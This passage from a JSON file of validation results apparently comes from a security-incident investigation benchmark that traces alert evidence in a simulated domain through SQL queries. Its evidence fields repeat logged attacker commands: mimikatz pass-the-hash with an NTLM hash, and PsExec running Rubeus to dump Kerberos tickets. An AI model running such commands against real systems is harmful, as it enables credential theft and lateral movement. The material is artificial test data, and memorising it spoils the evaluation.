+                "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 15,
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-21 22:34:52.714071+00:00",
+              "source_row_hash": "16ed885236c3561b3373c05721393899cd9ea29f56e1b66276671083ccbfb8d6",
+              "matched_inputs": [
+                "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 15,
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-20 22:39:29.272087+00:00",
+              "source_row_hash": "24658850e333f4661fae0915d507f2b3337a2ad28667e1054b9503b8b5c3b6aa",
+              "matched_inputs": [
+                "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Process_Identity' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Malicious credential theft tool execution detected",
+            "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_546045b7ece99c80",
+          "status": "ok",
+          "candidate_count": 54,
+          "unique_values": [
+            "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+            "6636__2024-06-27t14:32:46.5860644z__powershell.exe c:\\m365dattack\\get-krbticket.ps1"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+          "witnesses": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\"",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-27 22:35:10.766423+00:00",
+              "source_row_hash": "05d062928c99855b4204bbb0545ed142f3252486c83129dc0d667789257f8de1",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\"",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-05 22:34:21.233036+00:00",
+              "source_row_hash": "0e95e0392cf2a072835a1a919a404d13979751953ea78b167d2490dcf0739b3d",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\"",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-14 22:39:35.610006+00:00",
+              "source_row_hash": "20a9170559797ac3d4658e916a0921ad8f11eba201f3364b0aa299e0f7b89de2",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Process_Identity'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Possible use of the Rubeus kerberoasting tool",
+            "vnevado-win10v"
+          ],
+          "error": null
+        }
+      ]
+    }
+  ],
+  "offline_scope": "Uses official start entities; no intermediate or target value supplied to queries. Expected values checked only after results.",
+  "live_scope": "Exported merged PM/EM; session-local MySQL projection of original CSV, membership from SecurityIncident.AlertIds. Official graph supplies seed, expected path checked only AFTER full route execution.",
+  "delta": {
+    "sm": 0,
+    "em": 0,
+    "pm": 1
+  },
+  "live_validation_v1": [
+    {
+      "variant": "from_Command_File_Mention",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 307 (char 306)",
+          "alert_id": "74460ba6-f705-313a-8103-bcfb17b903cb"
+        }
+      ]
+    },
+    {
+      "variant": "from_File_Name",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 307 (char 306)",
+          "alert_id": "74460ba6-f705-313a-8103-bcfb17b903cb"
+        }
+      ]
+    },
+    {
+      "variant": "from_Process_Identity",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 307 (char 306)",
+          "alert_id": "74460ba6-f705-313a-8103-bcfb17b903cb"
+        }
+      ]
+    }
+  ],
+  "physical_revision": 2,
+  "verification": "exact_alert_and_edge_lineage"
+}
